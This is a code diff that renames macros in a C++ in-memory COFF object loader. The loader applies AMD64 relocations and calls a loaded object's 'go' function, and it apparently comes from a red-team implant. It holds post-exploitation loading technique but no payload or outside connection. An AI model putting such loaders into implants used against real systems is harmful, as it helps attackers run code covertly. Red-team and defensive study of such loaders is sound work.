@@ -118,21 +118,21 @@ auto Coff::RslRel(
     _In_ PVOID  Rel,
     _In_ UINT16 Type
 ) -> VOID {
-    PVOID FlRel = (PVOID)((ULONG_PTR)Base + C_DEF32( Rel ));
+    PVOID FlRel = (PVOID)((ULONG_PTR)Base + DEF32( Rel ));
 
     switch (Type) {
         case IMAGE_REL_AMD64_REL32:
-            C_DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32)); break;
+            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32)); break;
         case IMAGE_REL_AMD64_REL32_1:
-            C_DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 1); break;
+            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 1); break;
         case IMAGE_REL_AMD64_REL32_2:
-            C_DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 2); break;
+            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 2); break;
         case IMAGE_REL_AMD64_REL32_3:
-            C_DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 3); break;
+            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 3); break;
         case IMAGE_REL_AMD64_REL32_4:
-            C_DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 4); break;
+            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 4); break;
         case IMAGE_REL_AMD64_REL32_5:
-            C_DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 5); break;
+            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 5); break;
         case IMAGE_REL_AMD64_ADDR64:
             C_DEF64( Rel ) = (UINT64)(ULONG_PTR)FlRel; break;
     }
@@ -423,7 +423,7 @@ auto Coff::Loader(
                 if ( Relocs[x].Type == IMAGE_REL_AMD64_REL32 && CoffData.Sym[Relocs[x].SymbolTableIndex].Type == COFF_IMP ) {
 
                     ImportTable[Iterator] = CoffData.Sym[Relocs[x].SymbolTableIndex].Ptr;
-                    C_DEF32( RelocAddr ) = (UINT32)((ULONG_PTR)&ImportTable[Iterator] - (ULONG_PTR)RelocAddr - 4);
+                    DEF32( RelocAddr ) = (UINT32)((ULONG_PTR)&ImportTable[Iterator] - (ULONG_PTR)RelocAddr - 4);
                     Iterator++;
                     KhDbg("applied REL32 import relocation at %p", RelocAddr);
 
@@ -460,12 +460,12 @@ auto Coff::Loader(
         ) {
             for ( INT j = 0; j < SecNbrs; j++ ) {
                 if ( Symbols[i].SectionNumber == j + 1 ) {
-                    PVOID GoPtr = C_PTR( U_PTR( CoffData.Sec[j].Base ) + Symbols[i].Value );
+                    PVOID GoPtr = PTR( U_PTR( CoffData.Sec[j].Base ) + Symbols[i].Value );
                     ULONG OldProt = 0;
 
                     KhDbg("found 'go' function at 0x%p (Section %d, Offset 0x%X)", GoPtr, j, Symbols[i].Value);
 
-                    BOF_OBJ* Obj = (BOF_OBJ*)this->Add( MmBase, C_PTR( U_PTR( MmBase ) + MmSize ), UUID, CmdID );
+                    BOF_OBJ* Obj = (BOF_OBJ*)this->Add( MmBase, PTR( U_PTR( MmBase ) + MmSize ), UUID, CmdID );
                     if ( Obj ) KhDbg("added the object to the list");
 
                     VOID ( *Go )( BYTE*, ULONG ) = ( decltype( Go ) )( GoPtr );
